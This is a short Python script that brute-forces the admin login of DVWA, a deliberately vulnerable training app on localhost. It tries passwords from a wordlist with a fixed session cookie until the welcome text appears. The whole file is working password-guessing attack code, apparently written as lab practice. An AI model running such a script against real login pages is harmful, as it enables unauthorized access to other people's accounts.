import requests

def brute_force(login):
    with open("passwords.txt", "r") as file:
        for password in file:
            password = password.strip()

            url = f"http://localhost/dvwa/login.php" \
                  f"?username={login}" \
                  f"&password={password}" \
                  f"&Login=Login#"

            headers = {"Cookie": "PHPSESSID=bte085f9h6i083lmog9vip4mni;security=low"}

            try:
                response = requests.get(url, headers=headers)
                response.raise_for_status()


                if f"Welcome to the password protected area {login}" in response.text:
                    return password
            except requests.RequestException as e:
                pass

    return None

def main():
    password = brute_force("admin")

    if password is None:
        print("Password not found")
    else:
        print(f"Password is '{password}'")

if __name__ == "__main__":
    main()
